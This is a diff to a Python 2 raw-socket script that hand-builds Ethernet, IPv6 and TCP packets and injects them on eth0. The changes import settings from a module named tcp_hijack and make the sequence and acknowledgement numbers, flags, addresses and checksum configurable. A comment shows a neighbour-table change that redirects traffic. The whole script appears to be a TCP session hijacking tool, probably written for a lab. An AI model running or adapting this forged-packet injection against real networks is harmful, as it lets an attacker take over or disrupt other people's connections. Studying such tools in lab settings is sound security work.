@@ -1,6 +1,7 @@
 import socket
 import utils
 from fm import *
+from tcp_hijack import *
 
 my_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
 
@@ -18,7 +19,7 @@ def checksum(msg):
 
 	return su
 def build_pseudo_header(src_ip, dest_ip, data, upper_layer_packet_length):
-        zeros = '0000'
+        zeros = '000000'
         next_header = "06"
         pseudo_header = src_ip + dest_ip + upper_layer_packet_length + zeros + next_header 
         return pseudo_header
@@ -44,6 +45,10 @@ def build_tcp_header(src_port, dest_port, seq_no, ack_no, header_length, ack_fla
 
 	tcp_checksum = checksum(pseudo_header)
 
+        if CHECK_SUM != "":
+                tcp_checksum = CHECK_SUM
+        else:
+                tcp_checksum = ih4(tcp_checksum)
         # TCP
         print("\n## BUILDING TCP PACKET SOURCE ")
         print("## Source port       " + src_port)
@@ -56,8 +61,10 @@ def build_tcp_header(src_port, dest_port, seq_no, ack_no, header_length, ack_fla
         print("## Checksum          " + str(tcp_checksum))
         print("## Urgent pointer    " + urg_pointer)
         print("## Options           " + options)
+        
 
-        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + str(tcp_checksum) + urg_pointer + options
+
+        tcp_header = src_port + dest_port + seq_no + ack_no + header_length + str(tcp_flags) + window_size + tcp_checksum + urg_pointer + options
 	
 	return tcp_header
 
@@ -74,26 +81,26 @@ if __name__ == "__main__":
         # ip -6 neigh change 2001::20 lladdr 00:00:00:aa:00:01 dev eth0
 
         # ethernet
-        mac_dest = "000000aa0002"
-        mac_src =  "000000aa0000"
+        mac_dest = MAC_DESTINO
+        mac_src =  MAC_SOURCE
         eth_type = "86dd"
         ethernet_packet = mac_dest + mac_src + eth_type
 
         # ipv6
         version = "60"
-        flow_label = "0b2605"
-        payload_length = "0021"
+        flow_label = IPV6_FLOW_LABEL
+        payload_length = "0020"
         next_header = "06"
         hop_limit = "40"        
-        ipv6_src =   "20010000000000000000000000000020"
-        ipv6_dest  = "20010000000000000000000000000022"
+        ipv6_src =   IP_SRC
+        ipv6_dest  = IP_DEST
         ipv6_packet = version + flow_label + payload_length + next_header + hop_limit + ipv6_src + ipv6_dest
 
         # tcp
-        src_port = "94d2"
-        dest_port = "543f"
-        seq_no = "aab9ebb6"
-        ack_no = "6f3a45d4"
+        src_port = SRC_PORT
+        dest_port = DEST_PORT
+        seq_no = SEQ_NO
+        ack_no = ACK_NO
         header_length = "80"
         ack_flag = 0
         syn_flag = 0
@@ -101,10 +108,10 @@ if __name__ == "__main__":
         push_flag = 0
         reset_flag = 0
         urg_flag = 0
-        window_size = "00e0"
+        window_size = TCP_WINDOW_SIZE
         urg_pointer = '0000'
-        options = "0101080ad48c802f35f68d06"
-        data = "63"
+        options = OPTIONS
+        data = TCP_DATA
 
         # Ethernet
         print("\n## BUILDING ETHERNET PACKET SOURCE ")
@@ -123,10 +130,11 @@ if __name__ == "__main__":
         print("## Dest ipv6      " + ipv6_dest)   
 
 
-        tcp_packet = build_tcp_header(src_port, dest_port, seq_no, ack_no,header_length, 1, 0, 0, 1, 0, 0, window_size, urg_pointer, options, ipv6_src, ipv6_dest, data)
+        tcp_packet = build_tcp_header(src_port, dest_port, seq_no, ack_no,header_length, ACK_FLAG, SYN_FLAG, FIN_FLAG, PUSH_FLAG, RST_FLAG, 0, window_size, urg_pointer, options, ipv6_src, ipv6_dest, data)
 
         packet = ethernet_packet + ipv6_packet + tcp_packet + data
 
         print packet
 
-        my_socket.sendto(packet.decode("hex"), ("eth0", 0))
+        if SEND_PACKET_TO_NETWORK == 1 :
+                my_socket.sendto(packet.decode("hex"), ("eth0", 0))
